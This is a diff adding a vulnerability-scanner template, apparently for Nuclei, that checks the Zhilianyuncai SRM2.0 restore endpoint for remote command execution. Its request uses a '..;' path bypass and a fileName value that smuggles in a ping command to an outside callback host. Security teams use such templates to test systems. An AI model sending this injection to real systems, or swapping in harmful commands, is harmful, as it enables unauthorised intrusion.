@@ -1,0 +1,21 @@
+id: zhilianyuncai-restore-RCE
+
+info:
+  name: 智联云采 SRM2.0 restore 远程命令执行漏洞
+  author: zhilianyuncai
+  severity: high
+  tags: RCE
+
+http:
+  - raw:
+      - |
+        POST /adpweb/static/..;/a/db/dbBackupScheme/restore HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        fileName=1||ping%20{{interactsh-url}}
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+        - "dns"
